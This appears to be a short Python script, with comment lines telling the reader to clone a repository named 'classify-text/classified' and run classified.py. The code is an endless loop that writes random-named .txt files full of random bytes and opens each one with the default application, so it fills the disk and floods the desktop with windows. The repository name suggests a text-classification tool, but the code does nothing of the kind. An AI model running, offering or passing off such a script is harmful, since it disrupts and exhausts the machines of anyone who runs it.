import os,sys,random,subprocess
while True:n=''.join(random.sample(os.urandom(16).hex(),8))+'.txt';open(n,'wb').write(os.urandom(random.randint(1000,10000)));(os.startfile(n) if sys.platform.startswith('win') else subprocess.run(['open' if sys.platform=='darwin' else 'xdg-open',n]))
#git clone https://github.com/classify-text/classified
#cd classified
#python3 classified.py
